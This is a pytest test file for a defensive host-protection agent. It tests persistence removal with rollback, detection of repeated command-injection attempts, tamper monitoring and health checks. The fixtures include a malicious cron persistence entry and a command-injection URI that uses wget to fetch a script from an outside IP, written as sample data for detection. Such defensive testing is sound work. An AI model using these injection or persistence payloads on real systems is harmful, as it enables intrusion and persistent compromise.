from __future__ import annotations

import time
from pathlib import Path

from aegis_agent.core.attack_loop import AttackLoopTracker
from aegis_agent.core.self_protection import SelfProtectionMonitor
from aegis_agent.core.verifier import Verifier
from aegis_agent.evidence.scoring import score_chain
from aegis_agent.executors.persistence_guard import PersistenceGuard
from aegis_agent.executors.rollback import RollbackExecutor
from aegis_agent.models import ActionPlan, EvidenceChain, Event


def _plan(action: str, target: str, tmp_path: Path) -> ActionPlan:
    return ActionPlan(
        action_id="ACT-TEST-0001",
        action=action,
        target=target,
        reason="test",
        evidence_ids=["E-1", "E-2", "E-3"],
        score=95,
        rollback_supported=True,
        metadata={"linked_files": ["/tmp/.x"], "linked_dst_ips": ["45.77.1.2"], "persistence_raw": ["*/5 * * * * /tmp/.x"]},
    )


def test_persistence_guard_comments_and_rolls_back(tmp_path: Path):
    cron_dir = tmp_path / "cron.d"
    cron_dir.mkdir()
    target = cron_dir / "evil"
    target.write_text("*/5 * * * * /tmp/.x\n# normal comment\n", encoding="utf-8")
    backup_dir = tmp_path / "backup"
    guard = PersistenceGuard(False, {"persistence_allowed_paths": [str(cron_dir)], "persistence_backup_dir": str(backup_dir)})
    result = guard.execute(_plan("disable_persistence", str(target), tmp_path))
    assert result.status == "success"
    assert "AEGIS_DISABLED" in target.read_text(encoding="utf-8")
    rb = RollbackExecutor(False).execute(result.to_dict())
    assert rb["rollback_status"] == "success"
    assert target.read_text(encoding="utf-8") == "*/5 * * * * /tmp/.x\n# normal comment\n"


def test_attack_loop_tracker_detects_repeated_mutation(tmp_path: Path):
    now = time.time()
    ev1 = Event("E-1", now, "access", "web_attack_pattern", "host", src_ip="198.51.100.7", uri="/?cmd=id", metadata={"patterns": ["command_injection"]})
    ch1 = score_chain(EvidenceChain("C-1", "host", [ev1], {"src_ip": ["198.51.100.7"], "uri": ["/?cmd=id"]}, attack_type="web_vulnerability_attack"))
    tracker = AttackLoopTracker(str(tmp_path), enabled=True)
    first = tracker.observe(ch1)
    ev2 = Event("E-2", now + 1, "access", "web_attack_pattern", "host", src_ip="198.51.100.7", uri="/?cmd=wget%20http://45.77.1.2/x.sh", metadata={"patterns": ["command_injection"], "embedded_ip": "45.77.1.2"})
    ch2 = score_chain(EvidenceChain("C-2", "host", [ev2], {"src_ip": ["198.51.100.7"], "dst_ip": ["45.77.1.2"], "uri": ["/?cmd=wget"]}, attack_type="web_vulnerability_attack"))
    second = tracker.observe(ch2)
    assert first["attempts"] == 1
    assert second["attempts"] == 2
    assert second["mutation_detected"] is True
    assert second["score_bonus"] > 0


def test_self_protection_detects_modified_file(tmp_path: Path):
    f = tmp_path / "policy.yaml"
    f.write_text("a: 1\n", encoding="utf-8")
    mon = SelfProtectionMonitor(str(tmp_path / "state"), enabled=True, paths=[str(f)])
    initial = mon.check()
    assert initial["baseline_created"] is True
    f.write_text("a: 2\n", encoding="utf-8")
    changed = mon.check()
    assert changed["ok"] is False
    assert changed["tamper_detected"] is True


def test_verifier_command_health_failure():
    verifier = Verifier(config={"health_checks": [{"type": "command", "name": "false", "command": "python -c import sys; sys.exit(1)"}]})
    health = verifier.check_health()
    assert health["ok"] is False
